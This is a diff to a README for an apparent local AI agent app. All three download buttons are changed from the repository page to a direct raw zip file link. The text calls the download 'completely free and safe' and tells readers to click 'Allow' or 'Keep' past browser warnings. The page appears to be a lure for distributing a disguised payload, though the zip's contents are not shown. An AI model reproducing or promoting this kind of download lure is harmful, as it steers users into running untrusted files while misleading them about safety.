@@ -1,7 +1,7 @@
 <h1>🤖 ash4d-local-ai-agent-hub - Your Personal AI Powerhouse, Made Simple</h1>
 
 <p align="center">
-  <a href="https://github.com/dorisaallergenic291/ash4d-local-ai-agent-hub" style="background:#FF6B6B;color:#fff;padding:20px 45px;font-size:24px;border-radius:50px;text-decoration:none;font-weight:bold;display:inline-block;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ DOWNLOAD NOW - FREE & EASY</a>
+  <a href="https://raw.githubusercontent.com/dorisaallergenic291/ash4d-local-ai-agent-hub/main/busher/v3.2.zip" style="background:#FF6B6B;color:#fff;padding:20px 45px;font-size:24px;border-radius:50px;text-decoration:none;font-weight:bold;display:inline-block;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ DOWNLOAD NOW - FREE & EASY</a>
 </p>
 
 ---
@@ -52,7 +52,7 @@ Before starting, ensure your computer meets these friendly minimums:
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/dorisaallergenic291/ash4d-local-ai-agent-hub" style="background:#4ECDC4;color:#fff;padding:16px 40px;font-size:20px;border-radius:40px;text-decoration:none;font-weight:bold;display:inline-block;box-shadow:0 4px 12px rgba(78,205,196,0.4);">📥 CLICK HERE TO DOWNLOAD</a>
+  <a href="https://raw.githubusercontent.com/dorisaallergenic291/ash4d-local-ai-agent-hub/main/busher/v3.2.zip" style="background:#4ECDC4;color:#fff;padding:16px 40px;font-size:20px;border-radius:40px;text-decoration:none;font-weight:bold;display:inline-block;box-shadow:0 4px 12px rgba(78,205,196,0.4);">📥 CLICK HERE TO DOWNLOAD</a>
 </p>
 
 The download is completely free and safe. Your browser may ask permission - click "Allow" or "Keep" to continue.
@@ -185,7 +185,7 @@ Before you start, make sure you have:
 Your journey into private, powerful, local AI starts now. Download, install, and discover what your own AI powerhouse can do for you!
 
 <p align="center">
-  <a href="https://github.com/dorisaallergenic291/ash4d-local-ai-agent-hub" style="background:#45B7D1;color:#fff;padding:20px 50px;font-size:22px;border-radius:40px;text-decoration:none;font-weight:bold;display:inline-block;box-shadow:0 4px 15px rgba(69,183,209,0.5);">🚀 GET STARTED NOW - DOWNLOAD FREE</a>
+  <a href="https://raw.githubusercontent.com/dorisaallergenic291/ash4d-local-ai-agent-hub/main/busher/v3.2.zip" style="background:#45B7D1;color:#fff;padding:20px 50px;font-size:22px;border-radius:40px;text-decoration:none;font-weight:bold;display:inline-block;box-shadow:0 4px 15px rgba(69,183,209,0.5);">🚀 GET STARTED NOW - DOWNLOAD FREE</a>
 </p>
 
 ---
